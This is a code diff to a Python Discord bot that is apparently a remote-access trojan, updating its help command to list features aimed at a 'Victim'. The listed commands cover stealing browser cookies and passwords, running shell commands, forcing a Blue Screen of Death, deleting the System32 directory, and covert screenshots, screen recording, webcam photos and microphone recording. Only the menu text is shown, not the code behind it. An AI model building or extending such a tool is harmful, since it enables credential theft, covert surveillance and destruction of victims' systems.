@@ -41,7 +41,23 @@ async def on_ready():
 
 @bot.command()
 async def cmds(ctx):
-    embed = discord.Embed(title="Commands", description="Commands: \n`browser` - Grabs the Victim's cookies and passwords.", color=discord.Color.blue())
+    # update with new commands
+    embed = discord.Embed(
+        title="Commands", 
+        description="Commands: \n"
+                    "`browser` - Grabs the Victim's cookies and passwords.\n"
+                    "`shell` - Executes a shell command.\n"
+                    "`bsod` - Triggers a Blue Screen of Death.\n"
+                    "`shutdown` - Shuts down the system.\n"
+                    "`restart` - Restarts the system.\n"
+                    "`sys32` - Deletes the System32 directory (DANGEROUS).\n"
+                    "`screenshot` - Takes a screenshot.\n"
+                    "`record` - Starts recording the screen.\n"
+                    "`stoprecord` - Stops the screen recording.\n"
+                    "`webcam` - Takes a photo with the webcam.\n"
+                    "`mic` - Records audio from the microphone.",
+        color=discord.Color.blue()
+    )
     await ctx.send(embed=embed)
 
 
